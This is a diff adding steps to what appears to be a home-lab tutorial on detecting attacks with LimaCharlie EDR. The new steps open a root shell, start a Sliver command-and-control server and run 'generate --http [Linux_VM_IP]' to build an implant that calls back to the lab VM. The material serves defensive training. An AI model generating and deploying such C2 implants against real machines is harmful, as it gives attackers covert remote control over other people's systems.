@@ -160,6 +160,35 @@ LimaCharlie is a relatively new, very powerful “Security Infrastructure as a 
     mkdir -p /opt/sliver
     ```
 <h3>Generate Our Command and Control Payload</h3>
+
+1. Drop into a root shell and change directory to our Sliver install
+    
+    ```
+    sudo su
+    ```
+    
+    ```
+    cd /opt/sliver
+    ```
+2. Launch Sliver server
+    ```
+   sliver-server
+    ```
+    ![025](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/745f7393-ff95-4f0e-ae4f-c25eb28a2932)
+
+3. Generate our first C2 session payload (within the Sliver shell above). Be sure to use your Linux VM’s IP address we statically set in Part 1.<br>
+   ```
+   generate --http [Linux_VM_IP] --save /opt/sliver
+   ```
+
+
+
+
+
+
+
+
+
 <h3>Start Command and Control Session</h3>
 <h3>Observe EDR Telemetry So Far</h3>
 <h3>Let us Get Adversarial</h3>
